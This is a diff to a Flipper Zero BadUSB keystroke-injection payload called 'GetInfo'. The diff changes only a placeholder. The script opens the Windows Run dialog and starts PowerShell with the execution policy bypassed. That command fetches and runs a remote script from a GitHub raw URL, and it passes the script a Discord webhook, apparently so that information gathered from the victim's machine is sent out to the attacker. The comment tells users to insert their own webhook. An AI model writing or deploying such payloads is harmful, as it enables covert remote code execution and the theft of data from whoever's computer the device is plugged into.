@@ -1,5 +1,5 @@
 REM GetInfo:  make sure to replace: `link-to/getinfo.ps1` with your own url, with the modified discord webhook url in it too.
 GUI r
 DELAY 500
-ALTSTRING powershell -ExecutionPolicy Bypass -Command "& {param($hookUrl) . 'https://raw.githubusercontent.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/main/GetInfo.ps1' -hookUrl $hookUrl}" -hookUrl "link-to/getinfo.ps1"
+ALTSTRING powershell -ExecutionPolicy Bypass -Command "& {param($hookUrl) . 'https://raw.githubusercontent.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/main/GetInfo.ps1' -hookUrl $hookUrl}" -hookUrl "hook-url-link-here"
 ENTER
